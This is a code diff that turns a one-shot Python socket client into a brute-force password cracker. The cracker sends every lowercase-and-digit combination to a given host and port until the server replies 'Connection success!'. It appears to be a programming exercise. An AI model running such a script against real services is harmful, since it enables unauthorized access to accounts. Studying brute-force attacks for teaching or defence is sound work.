@@ -1,26 +1,49 @@
 import sys
 import socket
+import itertools
+
+from string import ascii_lowercase, digits
+
+# constant parameters
+MAX_PWD_LEN = 20
+RECV_SIZE = 1024
+
+
+def brute_force_generator():
+    symbols = ascii_lowercase + digits
+    for i in range(MAX_PWD_LEN):
+        for passwordCandidate in itertools.product(symbols, repeat=i):
+            if len(passwordCandidate) == 0:
+                continue
+
+            yield "".join(passwordCandidate)
+
+
+def password_cracker(hostname, port, password_generator):
+    # define socket
+    with socket.socket() as s:
+        address = (hostname, port)
+        s.connect(address)
+
+        while True:
+            password_guess = next(password_generator)
+
+            # send request
+            data = password_guess.encode()
+            s.send(data)
+
+            # receiving response
+            response = s.recv(RECV_SIZE)
+            response = response.decode()
+
+            if response == "Connection success!":
+                print(password_guess)
+                break
+
 
 # obtain input
 args = sys.argv
 hostname = args[1]
 port = int(args[2])
-guess = args[3]
 
-# define socket
-# TODO convert to context manager
-client_socket = socket.socket()
-address = (hostname, port)
-client_socket.connect(address)
-
-data = guess
-# send request
-data = data.encode()
-client_socket.send(data)
-
-# receiving response
-response = client_socket.recv(1024)  # TODO eliminate magic number
-response = response.decode()
-print(response)
-
-client_socket.close()
+password_cracker(hostname, port, brute_force_generator())
